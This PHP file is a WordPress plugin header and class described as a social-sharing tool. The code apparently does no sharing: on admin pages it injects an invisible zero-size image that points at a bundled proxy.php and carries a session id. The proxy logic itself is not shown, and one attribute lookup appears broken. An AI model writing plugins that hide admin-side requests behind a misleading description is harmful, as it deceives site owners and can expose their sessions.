<?php
/*
Plugin Name: Obsession
Plugin URI: http://www.yourpluginurlhere.com/
Version: 0.1
Author: Raiders
Description: One plugin, one javascript to share your posts to all your favorite social networks in a simple and sleek way.
*/

define("OBSESSION_VERSION", "0.1");
define("OBSESSION_PLUGIN_DIR", dirname(__FILE__) . "/");
define("OBSESSION_PLUGIN_URL", plugins_url("obsession/"));

include(OBSESSION_PLUGIN_DIR . "config.php");
//include(OBSESSION_PLUGIN_DIR . "proxy.php");


function obsession_init () {
	$obsession = new Obsession();
}

class Obsession {
	private $wp_actions = array(
		"in_admin_footer"
	);
	function __construct() {
		foreach ($this->wp_actions as $action) {
			add_action($action, array($this, "action_$action"));
		}
	}

	function action_in_admin_footer () {
		$attributes = array(
			'data-proxyurl' => OBSESSION_PLUGIN_URL . 'proxy.php',
			'alt' => 'Codename: Obsession',
			'style' => 'display:none;visibility:hidden;opacity:0;',
			'width' => '0',
			'height' => '0',
			'data-session' => '123',
			'data-proxymethod' => 'GET',
			'id' => 'obsession-img'
		);
		$img_attributes = 'src="'. $attributes["proxyurl"] . "?test=test" .'"';
		foreach($attributes as $attr => $val) {
			$img_attributes .= " $attr=\"" . $val . "\"";
		}
		include obsession_get_view ("admin_footer");
	}
}

obsession_init();
